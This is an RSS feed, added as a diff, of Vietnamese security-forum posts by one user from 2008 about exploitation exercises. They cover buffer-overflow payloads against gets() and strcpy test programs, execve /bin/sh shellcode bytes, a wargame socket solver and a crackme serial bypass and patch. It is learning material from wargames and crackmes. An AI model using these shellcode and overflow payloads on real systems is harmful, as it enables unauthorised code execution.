@@ -1,0 +1,457 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Messages posted by "Cognac"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/listByUser/176833.hva</link>
+		<description><![CDATA[Messages posted by "Cognac"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Re: Tìm lỗi và khai thác</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">StarGhost wrote:</cite><br>
+		<blockquote>Tớ là newbie nên còn đang mày mò nghịch ngợm. Có phải source đại khái là thế này không?
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>int doit&#40;char *str&#41;
+{
+	strcpy&#40;&#40;char *&#41;&#40;&#40;int&#41;&str - 16&#41;, str&#41;;
+	printf&#40;"%s\n", &#40;char *&#41;&#40;&#40;int&#41;&str - 16&#41;&#41;;
+	return 0;
+}
+
+int main&#40;int argc, char *argv&#91;&#93;&#41;
+{
+	if &#40;strlen&#40;argv&#91;1&#93;&#41; &gt; 8&#41;
+		*&#40;argv&#91;1&#93; + 8&#41; = 0;
+	doit&#40;argv&#91;1&#93;&#41;;
+	return 0;
+}</pre>
+		</div>
+&nbsp;
+		</blockquote>
+@StarGhost: Cậu reverse tương đối chuẩn, tuy nhiên theo mình thì ko có return 0 ở hàm doit.
+Anyway, cậu đã reverse code được rồi thì chạy dùm tớ cái này và giải thích hộ tớ
+Máy tớ là
+<blockquote>$ gdb ./exploitme1 
+GNU gdb 6.6-debian
+Copyright (C) 2006 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-linux-gnu"...
+Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+(gdb) <font color='orange'>run `python -c 'print "AAAA" + "BBBB" + "C"*497'`</font>
+Starting program: /home/Cognac/exploitme1 `python -c 'print "AAAA" + "BBBB" + "C"*497'`
+AAAABBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+<font color='red'>0x42424242</font> in ?? ()&nbsp;
+		</blockquote>
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/25730/156019.hva#156019</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/25730/156019.hva#156019</link>
+				<pubDate><![CDATA[Tue, 21 Oct 2008 04:28:15]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Đánh đố HTML</title>
+				<description><![CDATA[ @lamer: Có lẽ ý tưởng về encode và decode gần giống như vầy:
+(PHP hình như ko support các function liên quan đến charset US-ASCII, mình demo tạm encode & decode qua lại giữa UTF-8 và UTF-16)
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+    function utf16&#40;$str&#41; 
+         {
+                $utf8 = utf8_encode&#40;$str&#41;;
+                if&#40;function_exists&#40;'mb_convert_encoding'&#41;&#41;
+                 {
+                    return mb_convert_encoding&#40;$utf8, 'UTF-16', 'UTF-8'&#41;;
+                 } else 
+                         {
+                        return $str;
+                        }
+         }
+echo "encode ..."."&lt;br&gt;";
+  echo utf16&#40;$_GET&#91;'str'&#93;&#41;;
+echo "&lt;br&gt;";
+echo "decode ..."."&lt;br&gt;";
+echo mb_convert_encoding&#40;utf16&#40;$_GET&#91;'str'&#93;&#41;, 'UTF-8', 'UTF-16'&#41;
+
+?&gt;</pre>
+		</div>
+Ok, chạy thử
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://localhost/test.php?str=aaa
+--&gt;
+encode ...
+a�a�a
+decode ...
+aaa</pre>
+		</div>
+Kỹ thuật này liên quan đến lĩnh vực Masking Malware chăng? Nhờ bác lamer và các bạn gợi ý :)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/25580/155139.hva#155139</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/25580/155139.hva#155139</link>
+				<pubDate><![CDATA[Mon, 13 Oct 2008 19:15:37]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: PullThePlug wargame</title>
+				<description><![CDATA[ Nó output ra dạng tuple nên truy xuất giá trị của nó để cộng dồn 4 số lại phải dùng kiểu list để lấy giá trị. Công nhận là hơi khó chịu (có lẽ do mới vọc python)
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>import socket
+import struct
+from struct import *
+sock = socket.socket&#40;&#41;
+sock.connect&#40;&#40;'vortex.labs.pulltheplug.org', 5842&#41;&#41;
+len_int = 4
+i = 0
+sum = 0
+while &#40;i != 4&#41;:
+ num = unpack&#40;'&lt;I',sock.recv&#40;len_int&#41;&#41;
+ print num&#91;0&#93;
+ sum += num&#91;0&#93;
+ i += 1
+
+print sum
+sock.send&#40;pack&#40;'&lt;I',sum&#41;&#41;
+print sock.recv&#40;1024&#41;
+sock.close&#40;&#41;</pre>
+		</div>
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>wargame$ python test1.py 
+83808278
+183050462
+24982680
+1273023711
+1564865131
+Username: vortex1 Password: **********</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/23615/154495.hva#154495</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/23615/154495.hva#154495</link>
+				<pubDate><![CDATA[Wed, 8 Oct 2008 18:47:43]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: PullThePlug wargame</title>
+				<description><![CDATA[ @rickbb:
+bồ thử thêm 2 dòng:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&gt;&gt;&gt; from struct import *
+&gt;&gt;&gt;print unpack&#40;'I',in_data&#41;</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/23615/154288.hva#154288</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/23615/154288.hva#154288</link>
+				<pubDate><![CDATA[Tue, 7 Oct 2008 12:58:31]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Mr.Khoai wrote:</cite><br>
+		<blockquote>anh mrro,
+
+"Bài" này không giới hạn độ dài tối đa ở 30 bytes. Cái khoai đang tìm là một shellcode thật nhỏ. Nhỏ nhất là bao nhiêu thì khoai không biết. Nhưng khoai đã mò được một cái chỉ với 16 bytes, spawn /bin/sh và không bị la lên là "malicious code detected"
+
+Cognac,
+
+<font color='orange'>Ủa, cứ tưởng code asm là của bồ viết chứ, sao lại bảo khoai chuyển từ shellcode qua assembly? </font>
+
+to all,
+
+Bài này làm chơi cho vui. Đừng vướng vào lối mòn khi suy nghĩ. Nghĩ thoáng một chút sẽ tìm được một con shellcode hiệu quả mà kích thước lại nhỏ
+
+khoai&nbsp;
+		</blockquote>
+nói chơi một câu mà khó chịu vậy bồ  :). Thực tế spawshell trong trường hợp này thì chắc hẳn là bạn khai thác kiểu "local exploit" chứ ko phải "remote exploit" nên thay vì chúng ta mất 10 byte để push chuỗi /bin/sh, thì cất chuỗi đó trong biến môi trường rồi push vào, tiết kiệm được 5 byte. Bồ có chịu kiểu này ko?  :)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/25139/152478.hva#152478</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/25139/152478.hva#152478</link>
+				<pubDate><![CDATA[Mon, 22 Sep 2008 13:23:27]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ @MrKhoai: Bạn chuyển đoạn shellcode của mình sang assembly dùm, mình sẽ nhờ mọi người giải thích :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/25139/152262.hva#152262</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/25139/152262.hva#152262</link>
+				<pubDate><![CDATA[Sat, 20 Sep 2008 22:41:47]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ Đáp án này có vẻ khả thi hơn
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"' &gt;sh3llc0d3</pre>
+		</div>
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>./testshell sh3llc0d3
+your shellcode is less than 30 bytes! 10 bonus points
+$</pre>
+		</div>
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/25139/152201.hva#152201</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/25139/152201.hva#152201</link>
+				<pubDate><![CDATA[Sat, 20 Sep 2008 13:19:52]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: [ Thảo luận ] - Về Shellcode trên linux</title>
+				<description><![CDATA[ Anh Khoai chạy thử :
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>python -c 'print "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"' &gt;input</pre>
+		</div>
+rồi chạy
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>./testshell input</pre>
+		</div>
+PS: strlen(shellcode &gt;30) && strlen(shellcode &lt;50) thì ko được point nào ?? :-/ ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/25139/152189.hva#152189</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/25139/152189.hva#152189</link>
+				<pubDate><![CDATA[Sat, 20 Sep 2008 12:38:27]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">mrro wrote:</cite><br>
+		<blockquote>@Cognac: lúc đó sẽ có hai trường hợp:
+
+- có SSP <span class="link"> http://www.trl.ibm.com/projects/security/ssp/</span>) hay không? nếu có SSP thì đối với đoạn mã này mặc dù bị lỗi nhưng sẽ kô thể khai thác được, chỉ có làm cho chương trình nó crash thôi. 
+
+- không có SSP (compile với option <b>-fno-stack-protector</b>), lúc này mã dissasembly của đoạn chương trình trên sẽ như sau:
+
+<blockquote>(gdb) disas main
+Dump of assembler code for function main:
+0x080483a4 &lt;main+0&gt;:    lea    0x4(%esp),%ecx
+0x080483a8 &lt;main+4&gt;:    and    $0xfffffff0,%esp
+0x080483ab &lt;main+7&gt;:    pushl  -0x4(%ecx)
+0x080483ae &lt;main+10&gt;:   push   %ebp
+0x080483af &lt;main+11&gt;:   mov    %esp,%ebp
+0x080483b1 &lt;main+13&gt;:   push   %ecx
+0x080483b2 &lt;main+14&gt;:   sub    $0x24,%esp
+0x080483b5 &lt;main+17&gt;:   movl   $0x80484b0,(%esp)
+0x080483bc &lt;main+24&gt;:   call   0x804830c &lt;printf@plt&gt;
+0x080483c1 &lt;main+29&gt;:   lea    -0xc(%ebp),%eax
+0x080483c4 &lt;main+32&gt;:   mov    %eax,(%esp)
+0x080483c7 &lt;main+35&gt;:   call   0x80482ec &lt;gets@plt&gt;
+0x080483cc &lt;main+40&gt;:   lea    -0xc(%ebp),%eax
+0x080483cf &lt;main+43&gt;:   mov    %eax,0x4(%esp)
+0x080483d3 &lt;main+47&gt;:   movl   $0x80484c4,(%esp)
+0x080483da &lt;main+54&gt;:   call   0x804830c &lt;printf@plt&gt;
+0x080483df &lt;main+59&gt;:   mov    $0x0,%eax
+0x080483e4 &lt;main+64&gt;:   add    $0x24,%esp
+0x080483e7 &lt;main+67&gt;:   pop    %ecx
+0x080483e8 &lt;main+68&gt;:   pop    %ebp
+<font color='yellow'>0x080483e9 &lt;main+69&gt;:   lea    -0x4(%ecx),%esp</font>
+0x080483ec &lt;main+72&gt;:   ret    
+End of assembler dump.&nbsp;
+		</blockquote>
+
+
+Hơi khó exploit một chút, nhưng vẫn có thể exploit được. Bồ thử tìm hiểu cách exploit xem, gợi ý: chú ý vào <b>ecx</b>.
+
+--m&nbsp;
+		</blockquote>
+Đoạn tô vàng có nghĩa là lấy thanh ghi [ecx] -4, rồi move vào esp và ret???
+Vậy thì tui sẽ viết đè lên ecx với địa chị ($ebp+4), sau đó overwrite tiếp lên ebp địa chỉ của shellcode:
+mrro thử chạy
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>python -c 'print "A" * 8 + "\xb2\x83\x04\x08" + "\xAA\xBB\XCC\XDD"' | ./vul</pre>
+		</div>
+Trong đó \xAA\xBB\XCC\XDD là địa chỉ biến môi trường chứa shellcode chẳng hạn.
+Mô hình stack trong trường hợp này:
+
+high mem    --------------------------------------------------------&gt;  low mem
+[*argv]   [argc  ]  [eip  ]   [  %ecx-4   ]   [ebp  ]   [ecx   ]   [buf[8] ]
+
+
+
+PS: Tui ko nhớ cách input dạng này trong gdb khi run, bác mrro chỉ tui được ko?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24349/149739.hva#149739</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24349/149739.hva#149739</link>
+				<pubDate><![CDATA[Thu, 4 Sep 2008 18:46:00]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Chia sẻ những blogs hay</title>
+				<description><![CDATA[ <span class="link"> http://360.yahoo.com/conmale2000</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/13767/149535.hva#149535</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/13767/149535.hva#149535</link>
+				<pubDate><![CDATA[Wed, 3 Sep 2008 12:39:29]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Cho em xin thuật toán giải pt bậc 3</title>
+				<description><![CDATA[ nhân thêm (x+a) vào phương trình bậc 3, rồi giải phương trình bậc 4 tổng quát = phương pháp Abel :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24649/149072.hva#149072</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24649/149072.hva#149072</link>
+				<pubDate><![CDATA[Sat, 30 Aug 2008 12:57:36]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @Tal: Bạn có thể giải thích tại sao khi compile, bạn cho thằng -mpreferred-stack-boundary=2 được ko? :) 
+Cái này có lẽ liên quan đến memory allocate của gcc, dung lượng stack frame đc gcc cấp sẽ thay đổi phụ thuộc vào thuộc tính này ?? :-/ 
+Trong trường hợp này là
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>0x080483a7 &lt;main+3&gt;:	sub    $0x10,%esp</pre>
+		</div>
+@TaL, mrro: Bạn nói rõ hơn về stack layout của gcc 4.2.x được ko?  :). Cụ thể là nếu compile đoạn mã này bằng gcc 4.2 và preferred-stack-boundary=4 thì sẽ exploit thế nào?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24349/149069.hva#149069</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24349/149069.hva#149069</link>
+				<pubDate><![CDATA[Sat, 30 Aug 2008 12:38:51]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ <blockquote> #include &lt;string.h&gt;
+ #include &lt;stdio.h&gt;
+ 
+ int main(int argc, char **argv)
+ {
+   char <font color='yellow'>name[8]</font>;
+   printf("What is your name: ");
+   gets(name);
+   printf("Aha, your name is: %s\n",name);
+   return 0;
+ }
+@Ta&nbsp;
+		</blockquote>l: Đề nghị bạn <font color='yellow'>đọc kỹ</font> lại đoạn code của bạn xem độ dài buffer là bao nhiêu trước khi tiếp tục  :) ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24349/148757.hva#148757</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24349/148757.hva#148757</link>
+				<pubDate><![CDATA[Thu, 28 Aug 2008 11:18:07]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ Nhìn đoạn disassembly của bạn, mình đề nghị bạn chạy thử cái này xem:
+python -c 'print "A"*12 + "\xAA\xBB\xXCC\xDD"' |./vul
+
+Lưuý: \xAA\xBB\xCC\xDD là địa chỉ biến môi trường CODE chứa shellcode của bạn
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24349/148518.hva#148518</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24349/148518.hva#148518</link>
+				<pubDate><![CDATA[Mon, 25 Aug 2008 02:22:29]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: Vấn đề khi thử exploit hàm gets</title>
+				<description><![CDATA[ @Tal: bạn phải gdb debug xem chuyện gì xảy ra chứ ? Chứ nói vậy ai mà mò dùm bạn?
+Trước hết bạn cho vài thông tin:
+1.gcc --version
+2.gdb ./target
+disassemble main
+... vv]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/24349/147048.hva#147048</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/24349/147048.hva#147048</link>
+				<pubDate><![CDATA[Fri, 15 Aug 2008 13:22:04]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: [Thảo luận] Phân tích một crackme trên Linux :)</title>
+				<description><![CDATA[ Còn một cách nữa để phishing serial là dùng cách này của bác Izik
+Tham khảo
+<span class="link"> http://www.tty64.org/doc/revengwithld.txt</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/22743/146400.hva#146400</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/22743/146400.hva#146400</link>
+				<pubDate><![CDATA[Tue, 12 Aug 2008 12:32:22]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+			<item>
+				<title>Re: [Thảo luận] Phân tích một crackme trên Linux :)</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">mrro wrote:</cite><br>
+		<blockquote>Nếu chỉ cần hiện ra "Great work!" thì có cách đơn giản thế này:
+
+$ python -c 'print "\x00\x0a\x00\x0a"' | ./small
+-&gt; Small crackme for Stingduk &lt;-
+Give me your name (max 50 chars): Pass me the serial (max 50 chars): Great work!&nbsp;
+		</blockquote>
+Trường hợp của bạn mrro là một tình huống đặc biệt của keygen  :-/ và \x0a tương đương với "\r\n"  :-/  :-/ 
+Nên dùng python để input cái serial của bạn mèo thì cũng có thể làm thế này ?
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>python -c 'print "meoluoi\x0a9118715\x0a"' |./small</pre>
+		</div>
+hoặc đặc biệt hơn nữa
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>python -c 'print "\x00\x20\x00"' |./small</pre>
+		</div>
+ :-/ 
+Còn mình chỉ biết patch  :D 
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ gdb --write ./small -q
+Using host libthread_db library "/lib/libthread_db.so.1".
+&#40;gdb&#41; disassemble main
+Dump of assembler code for function main:
+0x080487bc &lt;main+0&gt;: push %ebp
+0x080487bd &lt;main+1&gt;: mov %esp,%ebp
+0x080487bf &lt;main+3&gt;: sub $0xe8,%esp
+.........................
+.........................
+0x080488c4 &lt;main+264&gt;: push %eax ; fake serial
+0x080488c5 &lt;main+265&gt;: push %edx ; real serial
+0x080488c6 &lt;main+266&gt;: call 0x8048668 &lt;strcmp@plt&gt; ;bp here
+0x080488cb &lt;main+271&gt;: add $0x10,%esp
+0x080488ce &lt;main+274&gt;: test %eax,%eax
+0x080488d0 &lt;main+276&gt;: jne 0x80488fa &lt;main+318&gt; ; Nhảy đến Bad boy nếu sai serial, có thể patch tại đây
+0x080488d2 &lt;main+278&gt;: sub $0x8,%esp
+0x080488d5 &lt;main+281&gt;: push $0x80486d8
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---return
+0x080488da &lt;main+286&gt;: sub $0xc,%esp
+0x080488dd &lt;main+289&gt;: push $0x8048b84 ; Great work!
+0x080488e2 &lt;main+294&gt;: push $0x8049db8
+0x080488e7 &lt;main+299&gt;: call 0x8048698 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
+0x080488ec &lt;main+304&gt;: add $0x14,%esp
+0x080488ef &lt;main+307&gt;: push %eax
+0x080488f0 &lt;main+308&gt;: call 0x8048658 &lt;_ZNSolsEPFRSoS_E@plt&gt;
+0x080488f5 &lt;main+313&gt;: add $0x10,%esp
+0x080488f8 &lt;main+316&gt;: jmp 0x8048920 &lt;main+356&gt;
+0x080488fa &lt;main+318&gt;: sub $0x8,%esp
+0x080488fd &lt;main+321&gt;: push $0x80486d8
+0x08048902 &lt;main+326&gt;: sub $0xc,%esp
+0x08048905 &lt;main+329&gt;: push $0x8048b90 ; No luck here mate
+0x0804890a &lt;main+334&gt;: push $0x8049db8
+------
+&#40;gdb&#41; x/x *0x080488d0
+0xec832875:     Cannot access memory at address 0xec832875
+&#40;gdb&#41; set {int} 0x080488d0=0xec832874
+&#40;gdb&#41; quit</pre>
+		</div>
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ ./small 
+-&gt; Small crackme for Stingduk &lt;-
+Give me your name &#40;max 50 chars&#41;: hello-world
+Pass me the serial &#40;max 50 chars&#41;: gudbye-world
+Great work!</pre>
+		</div>
+
+
+
+
+
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/22743/146396.hva#146396</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/22743/146396.hva#146396</link>
+				<pubDate><![CDATA[Tue, 12 Aug 2008 12:18:02]]> GMT</pubDate>
+				<author><![CDATA[ Cognac]]></author>
+			</item>
+	</channel>
+</rss>
